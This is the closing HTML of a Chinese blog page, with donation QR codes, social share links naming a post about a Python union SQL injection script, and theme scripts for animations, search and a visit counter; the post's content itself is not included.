    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
                <span class="reward-toggle-item alipayPay">支付宝</span>
            </div>
        </label>
        
        <i class="icon icon-caret-up"></i>
    </div>
</div>


    
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/&title=《python脚本之联合注入脚本》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/&title=《python脚本之联合注入脚本》 — oxxk blog&source=此脚本能实现最基础的联合查询注入。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/01/python脚本之联合查询/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《python脚本之联合注入脚本》 — oxxk blog&url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/&via=https://0xxk.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p class="wechatshare">扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLElEQVR42u3aO24DMQxFUe9/0xMgVQpLuY9UApi6qoJx7NFRQfCj1wuv53utnv9c++er766eHF4yZMj4WMazXXvG6tPVhvY8chxLqgwZMi5g7De3fzEBkDeu3ot+QYYMGTK2f/NPeUIpQ4YMGWcDLi9TZciQIaPDIEUsb6LxxJEwDtfiMmTI+EBGOhj4z7//cL4hQ4aMD2E84UoL2nTkWdyVDBkyRjP2CVwnstUadp2yVoYMGbcx0hBJqGkzLj5oGTJkjGbw0NYZFfSvmqEEVIYMGUMZ/Atpg6xT4pLf+aWIlSFDxlDGPqVLX8CHnbWAK0OGjBsYaaqXXnQg3+UttuUhypAhYzSj1t6qBVDyO7WmngwZMu5h1MaKPFDWQnZQ7sqQIWMogzfUaqG2Ns6Mr6DJkCFjNIN8nJagp8panj7KkCFjNqNTjp4dZNYK4DddQxkyZIxjpPVumkSmg8xa8SxDhozZDC47cCqlaxboCGTIkDGa0Wl4dcI0L1zJrmTIkDGbkSZtZCvp89pY9EVeIEOGjEEMXnx2Cs50c3E6KEOGjKEM3q0i4LSITZNOGTJk3Ml4wpUeQW2oGV/FkCFDxmhGv5XfmZf2i2cZMmTcwyBBljTR0tKUHE3xbogMGTKGMjoJHB+F8osUvJCWIUOGjFMjzDTIHhhkypAhQwZuz5FSNm3bvfl/GTJkXMBIQ95fbIWMBJZvkSFDxmhGWkDykNpPKGujUxkyZAxifAGBoAPxxv/GPgAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <!-- waves按钮特效 -->
<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<!-- 主题配置脚本 -->
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
</script>

<!-- jquery -->
<script src="/js/jquery.min.js?v=3.0"></script>

<!-- 搜索 -->

<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item waves-block waves-effect" onclick="location.href='{path}'">
    <div class="title ellipsis" title="{title}">{title}</div>
</li>
</template>


<!-- main博客脚本 -->
<script src="/js/main.min.js?v=3.0" ></script>

<!-- 动画&配置 -->
<script src="/js/script.min.js?v=3.0" ></script>

<!-- 脚本管理 -->
<script>

if(window.innerWidth > 800){
	/* 3D标题 */
	$(".content-header").on("mousemove", threedee);

	/* 底部追随鼠标 */
	$(".footer").hover(2);

	/* gotop键的涟漪 */
	$("#gotop").hover(1);

	/* 赞赏的粒子雨 */
	$("#reward").hover(3);

	/* 微信公众号的底部渲染 */
	$("#wechat").hover(4);

    /* 标题跳动 */
    $(".archivestitle").bumpyText();

	/* 图片点击放大 */
	const postimg = jQuery(".post-content img:not(.github-emoji)");
	postimg.on("click",function(){

		mask.classList.add("in");
		main.classList.add("Mask");
		menu.classList.add("Mask");
		var myimg = this.cloneNode(true);
		myimg.classList.add("imgShow");

		setTimeout(function(){
			jQuery(myimg).animate({
				opacity:"1"
			},1000);
		},0);

		document.body.appendChild(myimg);

		myimg.onclick=function(){
			document.body.removeChild(myimg);
			mask.classList.remove("in");
			main.classList.remove("Mask");
			menu.classList.remove("Mask");
		};

	});

}

/* 名字跳动 */
$("#name").bumpyText();


/* 网站运行时间 */
setInterval(function () {
	setTime("2017/10/11");
}, 1000);

/* 文章块的淡出 */
postshow();

/* 座右铭 */

   getHitokoto();



/* 粘贴提示 */
G($(".post-content"), location.href, "0xxk");


/* 控制台 */
if (window.console && window.console.log) {
	setTimeout(function () {
		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
	}, 0);
}

</script>




<!-- 公式渲染 -->



<!-- 不蒜子 -->

<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>


</body>
</html>
